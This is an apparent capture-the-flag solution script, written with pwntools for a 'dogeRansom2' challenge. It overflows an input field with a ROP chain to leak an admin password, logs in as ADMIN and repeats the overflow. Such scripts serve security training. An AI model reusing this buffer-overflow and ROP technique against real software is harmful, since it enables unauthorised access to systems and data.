#!/usr/bin/env python3
from pwn import *

elf = ELF('./dogeRansom2')
if args.REMOTE:
    r = remote("dogeransom2.challs.olicyber.it", 10806)
else:
    r = gdb.debug('./dogeRansom2')

r.recvuntil(b'Username: ')
r.sendline(b'Dr. Bez Casamiei')
r.recvuntil(b'Password: ')
r.sendline(b'Team-fortezza-10')

r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b': ')
r.sendline(b'1989')
r.recvuntil(b': ')
r.sendline(b'IT70S0501811800000012284030')
r.recvuntil(b': ')
r.sendline(b'IT70S0501811800000012284030' + b'\0' + b'\0' * (56 - 28 + 8) + p64(0x40224b) + p64(0x406240 + 32) + p64(elf.sym['puts']) + p64(0x40218F) + p64(elf.sym['login']))

password = r.recvline()
r.recvuntil(b'Username: ')
r.sendline(b'ADMIN')
r.recvuntil(b'Password: ')
r.send(password)

r.recvuntil(b'> ')
r.sendline(b'6')
r.recvuntil(b'> ')
r.sendline(b'Y')

r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b': ')
r.sendline(b'1989')
r.recvuntil(b': ')
r.sendline(b'IT70S0501811800000012284030')
r.recvuntil(b': ')
r.sendline(b'IT70S0501811800000012284030' + b'\0' + b'\0' * (56 - 28 + 8) + p64(0x40224b) + p64(0x406240 + 32) + p64(elf.sym['puts']) + p64(0x40218F) + p64(elf.sym['login']))

r.recvuntil(b'Username: ')
r.sendline(b'Dr. Bez Casamiei')
r.recvuntil(b'Password: ')
r.sendline(b'Team-fortezza-10')
r.interactive()